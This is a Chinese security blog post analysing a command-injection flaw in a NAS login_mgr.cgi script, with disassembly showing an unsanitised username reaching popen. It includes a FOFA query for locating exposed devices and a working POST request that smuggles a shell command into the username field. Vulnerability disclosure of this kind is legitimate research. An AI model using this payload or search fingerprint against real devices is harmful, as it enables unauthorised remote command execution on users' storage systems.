---
title: "西部数码 NAS  login_mgr.cgi 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-login_mgr-rce.html
asset_dir: assets/西部数码-nas-login_mgr.cgi-命令执行漏洞
---

# 西部数码 NAS login\_mgr.cgi 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/1 16:25
* 499浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

漏洞扫描服务

物流软件安全

文本剥离工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

西部数码NAS（网络附加存储）是西部数码提供的存储解决方案，旨在为用户提供便捷的文件存储、备份和共享服务。

漏洞扫描服务

西部数码NAS的`login_mgr.cgi`脚本存在多处[命令执行](https://mrxn.net/tag/rce)漏洞。该脚本在处理SNMP管理相关请求时，可能由于未对用户输入进行充分的过滤和验证，直接将用户提供的参数传递给系统命令执行函数或拼接进命令执行语句里。攻击者可以通过构造恶意的请求参数，注入操作系统命令，从而在服务器上[执行任意命令](https://mrxn.net/tag/rce)。

该漏洞可能导致攻击者完全控制NAS服务器，窃取存储在NAS上的敏感数据，篡改文件，植入恶意软件，甚至将NAS作为跳板攻击内网其他系统，对用户的数据安全和网络安全造成严重威胁。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

深入探索

技术文章订阅

服务器安全服务

漏洞预警服务

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"

# 漏洞分析

直接用 IDA 加载 login\_mgr.cgi 文件后，搜索进入漏洞点

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-001-f482b3ce09a6.webp)](https://image.mrxn.net/d1ea9c8b12a74437853c16c73360e619.webp)

如果`cmd=wd_login` 就跳转进入`loc_B448`

深入探索

网络安全会议

安全认证考试

Docker加速服务

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-002-96ff834e6c13.webp)](https://image.mrxn.net/acd0c501c8634107ad6547dc6e6a9edb.webp)

继续跟进 `sub_A1E0`

```
sub_A1E0

var_10FC= -0x10FC
var_10F8= -0x10F8
var_10F4= -0x10F4
var_10F0= -0x10F0
var_10EC= -0x10EC
var_10E8= -0x10E8
var_10E4= -0x10E4
var_10E0= -0x10E0
var_10DC= -0x10DC
var_10A8= -0x10A8
var_ED8= -0xED8
var_CE0= -0xCE0
var_AE0= -0xAE0
var_8E0= -0x8E0
var_8D8= -0x8D8
var_6E0= -0x6E0
var_6D8= -0x6D8
var_4E0= -0x4E0
var_4D8= -0x4D8
var_2E0= -0x2E0
var_100= -0x100
var_C0= -0xC0
var_80= -0x80
var_40= -0x40

PUSH    {R4-R11,LR}
SUB     SP, SP, #0x10C0
SUB     SP, SP, #0x1C
MOV     R5, #0
ADD     R3, SP, #0x1100+var_100
ADD     R0, SP, #0x1100+var_100
STR     R5, [R3,#0xA8]
STR     R5, [R3,#0xAC]
STR     R5, [R3,#0xB0]
STR     R5, [R3,#0xB4]
STR     R5, [R3,#0xB8]
STR     R5, [R3,#0xBC]
STR     R5, [R3,#0xC0]
STR     R5, [R3,#0xC4]
STR     R5, [R3,#0x88]
STR     R5, [R3,#0x8C]
STR     R5, [R3,#0x90]
STR     R5, [R3,#0x94]
STR     R5, [R3,#0x98]
STR     R5, [R3,#0x9C]
STR     R5, [R3,#0xA0]
STR     R5, [R3,#0xA4]
MOV     R1, R5          ; c
MOV     R2, #0x40 ; '@' ; n
ADD     R0, R0, #0x28 ; '(' ; s
BL      memset
ADD     R8, SP, #0x1100+var_4E0
ADD     R12, SP, #0x1100+var_100
ADD     R0, SP, #0x1100+var_2E0
STR     R5, [R12,#0xD0]
STR     R5, [R12,#0xD4]
STR     R5, [R12,#0xC8]
STR     R5, [R12,#0xCC]
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R8, R8, #8
ADD     R0, R0, #8      ; s
ADD     R10, SP, #0x1100+var_6E0
BL      memset
ADD     R10, R10, #8
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R8          ; s
ADD     R9, SP, #0x1100+var_8E0
BL      memset
ADD     R9, R9, #8
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R10         ; s
BL      memset
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R9          ; s
BL      memset
ADD     R0, SP, #0x1100+var_AE0
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R0, R0, #8      ; s
BL      memset
ADD     R0, SP, #0x1100+var_CE0
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
ADD     R11, SP, #0x1100+var_ED8
ADD     R0, R0, #8      ; s
ADD     R7, SP, #0x1100+var_10A8
BL      memset
SUB     R7, R7, #0x30 ; '0'
MOV     R1, R5          ; c
MOV     R2, #0x200      ; n
MOV     R0, R11         ; s
BL      memset
MOV     R2, #0x200      ; n
MOV     R1, R5          ; c
MOV     R0, R7          ; s
BL      memset
ADD     R1, SP, #0x1100+var_100
STR     R5, [R1,#0x68]
STR     R5, [R1,#0x6C]
STR     R5, [R1,#0x70]
STR     R5, [R1,#0x74]
STR     R5, [R1,#0x78]
STR     R5, [R1,#0x7C]
STR     R5, [R1,#0x80]
STR     R5, [R1,#0x84]
MOV     R0, R5          ; timer
BL      time
ADD     R4, SP, #0x1100+var_80
ADD     R1, SP, #0x1100+var_80
ADD     R4, R4, #8
ADD     R1, R1, #0x28 ; '('
MOV     R2, #0x20 ; ' '
STR     R0, [SP,#0x1100+var_10F4]
LDR     R0, =aUsername  ; "username"
BL      cgiFormString
MOV     R2, #0x20 ; ' '
MOV     R1, R4
LDR     R0, =aPwd       ; "pwd"
BL      cgiFormString
ADD     R0, SP, #0x1100+var_100
ADD     R0, R0, #0x28 ; '(' ; u_char *
MOV     R1, R4          ; char *
MOV     R2, #0x20 ; ' '
BL      sub_BD60
ADD     R0, SP, #0x1100+var_80
ADD     R0, R0, #0x28 ; '(' ; s
MOV     R1, #0x5C ; '\' ; c
BL      index
CMP     R0, #0
BEQ     loc_AB38
```

在 `0xA388` 处检查 `username` 是否包含 `\` 字符。如果包含，则取 `\` 之后的部分作为待拼接的字符串（`R2` 寄存器）。随后，在 `0xA3A4` 处，该字符串被 `sprintf` 函数直接格式化到 `net ads search -P '(... sAMAccountName=%s ...)'` 命令字符串中。

代码安全审计

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-003-66bdb52bf616.webp)](https://image.mrxn.net/2ca3b0a508894089ae8bfe38535e5be3.webp)

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-004-6936d6a3564b.webp)](https://image.mrxn.net/0428df5a12014be4b32176cb9c177e0a.webp)

最终拼接成的完整命令字符串，在 `0xA3B4` 处被传递给 `popen` 函数执行。`popen` 会创建一个新的 shell 进程来[执行该命令](https://mrxn.net/tag/rce)。

# 漏洞复现

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-005-96537bc7c062.webp)](https://image.mrxn.net/aa50b1a7f8914d23a919c88425d1420f.webp)

```
POST /cgi-bin/login_mgr.cgi HTTP/1.1
Host: west-nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

cmd=wd_login&username=\admin'$(id>/var/www/t.png)'&pwd=123456
```

[![西部数码 NAS  login_mgr.cgi 命令执行漏洞](images/img-006-fff0ef2e6e7f.webp)](https://image.mrxn.net/ee20ac11d54d435ca21dd3a547843568.webp)

成功[执行id命令](https://mrxn.net/tag/rce)并写入文件

物流软件安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS login\_mgr.cgi 命令执行漏洞](https://mrxn.net/jswz/west-nas-login_mgr-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-login_mgr-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-login\_mgr-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全研究工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKIklEQVR4AeycjXYbuQ6D/fX937lrDA8kWn8eu0nG26qnLCgApCbiyGmz99xft9vt95/G78WvUe+F/eFZWt+o14jLda0+0jLnvK3T2toIpX9FaCD3Pvv3p5xAGch96rdXYvQFADfgQRr1BDqfi7LfHIR/pNkzQ9dYh+gFmHpA4Hg212XMRghf5pznmjO564RlIFrsuP4EuoFATB7G+OojQ/TJdX5rMge9z/rIby6j/RC9oKK1kd9aRuhroXLuk2vaHKof+rz1a90NROSO605gD+S6sx/u/C0DgXo9fbWhchB5fiL7Muccej/0nHtkdA9zXs/Qvowz73fw3zKQ73jQf6XnJQPx2wfxlgMvn7d7jAqB46+uQPmr/Mj3Kuc9ha/WnvV/z0DO7r593QnsgXRHci3RDUTXcRWvPi7Ex0fuCXMOQgO6rYDyUQSRd6YJAa/5cxvoa6Hnco3y/DWPcnna6AbSGvb6Z0+gDARi4nAOV4+Z34aVb6TlWohnMZf95iA8QJbfzoHjFr7d4F4I0QPO4b2k/C4DKcxOLj2BPZBLj7/f/Jev/p+g27oH1Ktq7SxCrXW/US2EL2sQnOuEWZ/lEHXAzHLwwPFxBhzr/If2+orYNySf6gfk3UCA6Vug54WqwziXz+G3xmuhOaj15jLKq4DwZW2Vq2YWEL2g/is+9xrVWR9pEP2yBsHBOcy13UCy+GH5P/E4vyCm6K/Wb4MQQoOKI5+8ipFm7hlC3QMid416KyB4qGiPECoPj7nq24BHD6A2XQDHp0Yn3An3hPAAdzZ+W8sYSvxpHjj6A7d9Q26f9WsP5LPm0d8QqNfHV2qEUH0QuX2jrxHCAxXtz5hroXrh9W/C6ut+8NgLsDREoHyMqI8iG7VWmFPehjUhRD/lq9g3ZHU6F2hlIBATzFOG4PJzQXDZ59w+CA9UtCa0H8a6PAr7jND7oXL2qbaNkTbiXGdNCLGHNSH0nHgFzDX1c8jbRhlIK+z1NSewB3LNuU937X6WNXJCXEGo31ihchC5a30lheYywqM/azmHR5/6OSA0r4UQHFQUr4Dgcn/n0tuwJmw1rcUrIPpCRekK6Q6tFV5nFO/YNySfzAfk5V/qEBPOz+SpZYTwZc41EBpUtM8e4YiDqLEmlFcBoSlfhWoUZzzywbm+MPepTxvQ+6Hn/JwQGtD/O+S2f116Avsj69Lj7zc/NRCoV8otoOes5SsM4cvcyGcuo2sy53yl2TNCiOcBigyUf5UXMiWrvaDWQuSv+tNW+yMrH8Yn5OWGeKoQU4aK1mboL8S61xmh9oPIs+5aCA3IcpcD5a2Gx9y9hG2hOIc1r4XmMsJjfyDLp3L1bmNUWAYyEjf38yewB/LzZ77csRtIvlauBMrHw1kOosb9XJcRwgMU2n4hcOyrXAGxhvoTA/EON4Hqg8hbj71CCA9UFO9wbUZrZxGi9zN/N5BnBVs/dQJvm8pAICYIFd119GaMuLN+19ovhNhXuWPkswZzv+uE9o9QumKkQfSHMY5qzEHUeJ0RQgMyXfIykMLs5NITKD/t9VPojWnDWkbg+HyH/vMcqgbzPPd7Nfcz5jro97IOoXn9